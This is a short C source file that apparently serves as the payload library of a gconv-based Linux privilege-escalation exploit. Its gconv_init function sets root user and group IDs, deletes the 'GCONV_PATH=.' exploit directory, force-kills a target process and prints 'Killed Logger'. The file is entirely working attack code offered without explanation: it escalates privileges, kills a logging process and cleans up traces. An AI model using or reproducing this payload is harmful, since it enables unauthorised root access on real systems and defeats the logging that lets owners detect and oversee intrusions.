#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void gconv() {}
void gconv_init(int target_pid) {
    setuid(0); setgid(0);
    seteuid(0); setegid(0);
    char command[256];
    snprintf(command, sizeof(command), "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin; rm -rf 'GCONV_PATH=.'; kill -9 %d; echo 'Killed Logger'", target_pid);
    system(command);
    exit(0);
}
